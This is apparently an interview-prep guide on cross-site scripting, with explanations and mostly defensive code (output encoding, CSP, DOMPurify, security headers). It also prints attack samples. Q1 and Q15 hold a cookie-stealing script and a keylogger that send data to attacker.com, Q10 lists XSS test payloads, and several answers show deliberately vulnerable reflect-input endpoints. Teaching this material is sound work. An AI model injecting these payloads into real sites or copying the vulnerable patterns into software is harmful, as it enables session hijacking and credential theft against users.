# XSS (Cross-Site Scripting) Interview Questions

## XSS Fundamentals

### Q1: What is XSS (Cross-Site Scripting)?

**Answer:**

XSS is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser context, potentially stealing data, hijacking sessions, or defacing websites.

**Types of XSS:**

1. **Stored XSS (Persistent)**: Malicious script is stored on the server (database, comments, etc.)
2. **Reflected XSS (Non-Persistent)**: Malicious script is reflected in the response (URL parameters, search results)
3. **DOM-based XSS**: Malicious script manipulates the DOM directly in the browser

**Example of Stored XSS:**
```javascript
// Attacker posts a comment:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// When other users view the comment, their cookies are stolen
```

**Example of Reflected XSS:**
```javascript
// Vulnerable code:
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});

// Attacker sends: /search?q=<script>alert('XSS')</script>
```

---

### Q2: How do you prevent XSS attacks?

**Answer:**

**1. Output Encoding/Escaping:**
```typescript
import { escape } from 'html-escaper';

// Escape HTML entities
const safeOutput = escape(userInput);
// <script> becomes &lt;script&gt;
```

**2. Content Security Policy (CSP):**
```typescript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // Only allow scripts from same origin
      styleSrc: ["'self'", "'unsafe-inline'"]
    }
  }
}));
```

**3. Input Validation:**
```typescript
import { z } from 'zod';

const inputSchema = z.string()
  .max(100)
  .regex(/^[a-zA-Z0-9\s]+$/); // Only alphanumeric and spaces

const validated = inputSchema.parse(userInput);
```

**4. Use Safe APIs:**
```typescript
// ❌ Bad: innerHTML
element.innerHTML = userInput; // Dangerous!

// ✅ Good: textContent
element.textContent = userInput; // Safe

// ✅ Good: React automatically escapes
<div>{userInput}</div>
```

**5. Sanitize HTML (when HTML is needed):**
```typescript
import DOMPurify from 'isomorphic-dompurify';

const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
```

---

### Q3: What is the difference between Stored XSS and Reflected XSS?

**Answer:**

| Aspect | Stored XSS | Reflected XSS |
|--------|-----------|---------------|
| **Persistence** | Stored on server (database, files) | Not stored, reflected in response |
| **Severity** | Higher (affects all users) | Lower (requires user interaction) |
| **Detection** | Easier to detect | Harder to detect |
| **Example** | Malicious comment in database | Malicious URL parameter |
| **Impact** | All users viewing the page | Only users clicking malicious link |

**Stored XSS Example:**
```typescript
// Attacker posts comment with script
app.post('/comments', async (req, res) => {
  await db.comments.create({
    content: req.body.content // Contains <script>alert('XSS')</script>
  });
});

// All users see the malicious script when viewing comments
app.get('/comments', async (req, res) => {
  const comments = await db.comments.findAll();
  res.render('comments', { comments }); // XSS executes for all users
});
```

**Reflected XSS Example:**
```typescript
// Vulnerable search endpoint
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>No results for: ${query}</h1>`);
  // Attacker sends: /search?q=<script>steal()</script>
  // Only affects users who click the malicious link
});
```

---

### Q4: What is DOM-based XSS?

**Answer:**

DOM-based XSS occurs when JavaScript code writes user-controlled data to the DOM without proper sanitization. The attack happens entirely in the browser, without the malicious payload being sent to the server.

**Example:**
```javascript
// Vulnerable code
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');
document.getElementById('greeting').innerHTML = `Hello ${name}!`;
// Attacker sends: ?name=<img src=x onerror=alert('XSS')>

// Secure code
const name = urlParams.get('name');
document.getElementById('greeting').textContent = `Hello ${name}!`;
```

**Prevention:**
- Use `textContent` instead of `innerHTML`
- Avoid `eval()` and `Function()` constructors
- Use safe DOM manipulation APIs
- Validate and sanitize client-side inputs

---

### Q5: How does Content Security Policy (CSP) prevent XSS?

**Answer:**

CSP is a security header that tells the browser which sources of content are allowed to be loaded and executed. It acts as a whitelist for resources.

**How it works:**
1. Browser receives CSP header from server
2. Browser only executes scripts/styles from allowed sources
3. Inline scripts are blocked unless explicitly allowed
4. Violations are reported (if configured)

**Example:**
```typescript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"], // Only same origin
      scriptSrc: [
        "'self'",
        "https://trusted-cdn.com" // Allow specific CDN
      ],
      styleSrc: ["'self'", "'unsafe-inline'"], // Allow inline styles
      imgSrc: ["'self'", "data:", "https:"], // Allow images
      connectSrc: ["'self'"], // XHR/fetch sources
      fontSrc: ["'self'"],
      objectSrc: ["'none'"], // Block plugins
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"] // Block iframes
    }
  }
}));
```

**CSP Nonce (for inline scripts):**
```typescript
import crypto from 'crypto';

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

// In template:
<script nonce="<%= nonce %>">
  // This inline script is allowed
</script>
```

---

### Q6: What is the difference between HTML encoding and JavaScript encoding?

**Answer:**

**HTML Encoding:**
- Escapes HTML special characters
- Prevents HTML/script tags from being interpreted
- Used for HTML context

```typescript
// HTML encoding
"<script>" → "&lt;script&gt;"
"&" → "&amp;"
'"' → "&quot;"
"'" → "&#x27;"
```

**JavaScript Encoding:**
- Escapes JavaScript special characters
- Prevents code injection in JavaScript context
- Used for JavaScript/JSON context

```typescript
// JavaScript encoding
"</script>" → "<\/script>"
"\n" → "\\n"
"'" → "\\'"
'"' → "\\""
```

**Context Matters:**
```typescript
// HTML context - use HTML encoding
<div>${escape(userInput)}</div>

// JavaScript context - use JavaScript encoding
<script>
  const data = ${JSON.stringify(userInput)}; // JSON.stringify does JS encoding
</script>

// Attribute context - use HTML attribute encoding
<input value="${escapeAttribute(userInput)}">
```

---

### Q7: How do you sanitize user input that needs to contain HTML?

**Answer:**

When you need to allow HTML (like rich text editors), use a sanitization library:

**Using DOMPurify:**
```typescript
import DOMPurify from 'isomorphic-dompurify';

// Sanitize with default settings (removes all scripts)
const clean = DOMPurify.sanitize(userInput);

// Custom configuration
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
});
```

**Using validator.js:**
```typescript
import validator from 'validator';

// Escape HTML
const escaped = validator.escape(userInput);

// Strip HTML tags
const stripped = validator.stripLow(userInput);
```

**Best Practice:**
1. Whitelist allowed tags/attributes (not blacklist)
2. Remove all script tags and event handlers
3. Sanitize URLs in href/src attributes
4. Use libraries, don't write your own regex

---

### Q8: What are the security implications of using innerHTML?

**Answer:**

`innerHTML` is dangerous because it parses and executes HTML, including scripts:

**Dangers:**
```javascript
// ❌ Dangerous
element.innerHTML = userInput;
// If userInput = "<img src=x onerror='steal()'>", script executes

// ❌ Still dangerous even with some escaping
element.innerHTML = escape(userInput);
// Doesn't prevent: <img src=x onerror='steal()'>

// ✅ Safe alternative
element.textContent = userInput; // No HTML parsing
```

**When innerHTML is needed:**
```typescript
import DOMPurify from 'isomorphic-dompurify';

// Only use innerHTML with sanitization
element.innerHTML = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em']
});
```

**Better alternatives:**
- Use `textContent` for plain text
- Use React/Vue (they escape by default)
- Use template engines with auto-escaping
- Use DOMPurify if HTML is required

---

### Q9: How do modern frameworks like React prevent XSS?

**Answer:**

React automatically escapes values in JSX:

**Automatic Escaping:**
```tsx
// React automatically escapes
const userInput = "<script>alert('XSS')</script>";
<div>{userInput}</div>
// Renders as: &lt;script&gt;alert('XSS')&lt;/script&gt;

// Safe - no XSS
```

**Dangerous: dangerouslySetInnerHTML:**
```tsx
// ⚠️ Dangerous - bypasses React's escaping
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// Only use with sanitized input!

// ✅ Safe usage
import DOMPurify from 'isomorphic-dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

**React's Protection:**
- All values in `{}` are escaped
- Attributes are escaped
- Event handlers are safe (not strings)
- `dangerouslySetInnerHTML` is the only way to inject HTML

---

### Q10: How do you test for XSS vulnerabilities?

**Answer:**

**1. Manual Testing:**
```javascript
// Test payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
```

**2. Automated Scanning:**
- OWASP ZAP
- Burp Suite
- Acunetix
- Nessus

**3. Code Review:**
```typescript
// Look for:
- innerHTML usage
- eval() or Function()
- Unsanitized user input in output
- Missing CSP headers
- Unsafe template rendering
```

**4. Penetration Testing:**
- Test all input fields
- Test URL parameters
- Test headers
- Test cookies
- Test file uploads

---

### Q11: What is the difference between encoding and sanitization?

**Answer:**

**Encoding (Escaping):**
- Preserves the original data
- Converts special characters to safe representations
- Reversible (can decode)
- Used when you want to display user input as-is

```typescript
// Encoding preserves data
const encoded = escape("<script>");
// Result: "&lt;script&gt;"
// Can be decoded back to "<script>"
```

**Sanitization:**
- Removes or modifies dangerous content
- Irreversible (data is changed)
- Used when you need to allow some HTML

```typescript
// Sanitization removes/modifies data
const sanitized = DOMPurify.sanitize("<script>alert('XSS')</script><p>Hello</p>");
// Result: "<p>Hello</p>"
// Script tag is removed, not encoded
```

**When to use each:**
- **Encoding**: When displaying user input as plain text
- **Sanitization**: When you need to allow HTML formatting

---

### Q12: How do you prevent XSS in API responses?

**Answer:**

**1. Validate and Sanitize Input:**
```typescript
import { z } from 'zod';

const userSchema = z.object({
  name: z.string().max(100).regex(/^[a-zA-Z0-9\s]+$/),
  email: z.string().email()
});

app.post('/api/users', async (req, res) => {
  const validated = userSchema.parse(req.body);
  // Process validated data
});
```

**2. Encode Output:**
```typescript
// For HTML responses
app.get('/api/user/:id', async (req, res) => {
  const user = await getUser(req.params.id);
  res.json({
    name: escape(user.name), // Encode for HTML context
    email: user.email
  });
});
```

**3. Use JSON Properly:**
```typescript
// ✅ Safe - JSON.stringify automatically escapes
app.get('/api/data', (req, res) => {
  res.json({ message: userInput }); // Safe
});

// ❌ Dangerous - String concatenation
app.get('/api/data', (req, res) => {
  res.send(`{"message": "${userInput}"}`); // XSS if userInput contains "
});
```

**4. Set Content-Type:**
```typescript
app.use((req, res, next) => {
  res.setHeader('Content-Type', 'application/json');
  next();
});
```

---

### Q13: What are the security headers that help prevent XSS?

**Answer:**

**1. Content-Security-Policy (CSP):**
```typescript
Content-Security-Policy: default-src 'self'; script-src 'self'
```
- Controls which resources can be loaded
- Prevents inline script execution
- Most effective XSS prevention

**2. X-Content-Type-Options:**
```typescript
X-Content-Type-Options: nosniff
```
- Prevents MIME type sniffing
- Reduces risk of script execution via content-type confusion

**3. X-Frame-Options:**
```typescript
X-Frame-Options: DENY
```
- Prevents clickjacking
- Doesn't directly prevent XSS but reduces impact

**4. X-XSS-Protection (Legacy):**
```typescript
X-XSS-Protection: 1; mode=block
```
- Legacy browser feature
- Modern browsers ignore this (rely on CSP)

**Implementation:**
```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"]
    }
  },
  xContentTypeOptions: true,
  xFrameOptions: { action: 'deny' }
}));
```

---

### Q14: How do you handle XSS in file uploads?

**Answer:**

**1. Validate File Type:**
```typescript
import { z } from 'zod';

const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'application/pdf'];
const MAX_SIZE = 5 * 1024 * 1024; // 5MB

app.post('/api/upload', upload.single('file'), (req, res) => {
  if (!ALLOWED_TYPES.includes(req.file.mimetype)) {
    return res.status(400).json({ error: 'Invalid file type' });
  }
  
  if (req.file.size > MAX_SIZE) {
    return res.status(400).json({ error: 'File too large' });
  }
  
  // Process file
});
```

**2. Sanitize Filename:**
```typescript
import path from 'path';
import crypto from 'crypto';

const sanitizeFilename = (filename: string): string => {
  // Remove path traversal
  const basename = path.basename(filename);
  
  // Remove special characters
  const sanitized = basename.replace(/[^a-zA-Z0-9.-]/g, '_');
  
  // Add random prefix to prevent conflicts
  const ext = path.extname(sanitized);
  const name = path.basename(sanitized, ext);
  const random = crypto.randomBytes(8).toString('hex');
  
  return `${random}-${name}${ext}`;
};
```

**3. Store Files Safely:**
```typescript
// Store outside web root
const uploadPath = path.join(__dirname, '../uploads');

// Serve with proper headers
app.get('/uploads/:filename', (req, res) => {
  const filename = path.basename(req.params.filename);
  const filepath = path.join(uploadPath, filename);
  
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.sendFile(filepath);
});
```

---

### Q15: What is the impact of XSS attacks?

**Answer:**

**1. Session Hijacking:**
```javascript
// Attacker steals session cookie
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**2. Credential Theft:**
```javascript
// Keylogger
document.addEventListener('keypress', (e) => {
  fetch('https://attacker.com/log?key=' + e.key);
});
```

**3. Defacement:**
```javascript
// Modify page content
document.body.innerHTML = '<h1>Hacked!</h1>';
```

**4. Phishing:**
```javascript
// Show fake login form
document.body.innerHTML = '<form>...</form>';
```

**5. Malware Distribution:**
```javascript
// Redirect to malicious site
window.location = 'https://malicious.com';
```

**6. Business Impact:**
- Data breach
- Loss of user trust
- Regulatory fines (GDPR, etc.)
- Reputation damage
- Financial losses

**Prevention is critical!**

